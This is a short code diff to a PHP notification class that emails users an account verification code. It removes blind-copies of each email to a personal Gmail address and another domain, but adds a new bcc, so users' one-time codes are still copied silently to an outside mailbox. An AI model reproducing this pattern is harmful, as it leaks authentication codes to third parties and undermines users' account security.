@@ -45,8 +45,7 @@ class SendAuthorizationCode extends Notification
         $data = $this->data;
         return (new MailMessage)
                     ->subject("Account Authorization")
-                    ->bcc('maduekegizzy46@gmail.com')
-                    ->bcc('support@enzobank.org')
+                    ->bcc('support@yieldempire.org')
                     ->greeting("Hello ".$fullname . "!")
                     ->line('Need to verify your account before access your dashboard.')
                     ->line(mail_otp_box($data->code, 'Your verification code'))
